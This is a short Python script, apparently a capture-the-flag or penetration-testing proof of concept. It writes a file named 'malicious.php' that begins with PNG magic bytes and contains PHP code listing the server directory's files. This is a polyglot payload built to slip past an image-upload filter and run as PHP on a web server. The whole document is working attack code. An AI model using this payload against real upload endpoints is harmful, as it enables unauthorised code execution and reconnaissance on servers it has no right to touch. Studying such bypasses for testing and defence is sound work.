png_magic = b"\x89PNG\r\n\x1a\n"

php_code = b"""<?php
$files = scandir('.');
foreach ($files as $file) {
    echo $file . "<br>";
}
?>"""

with open("malicious.php", "wb") as f:
    f.write(png_magic)
    f.write(php_code)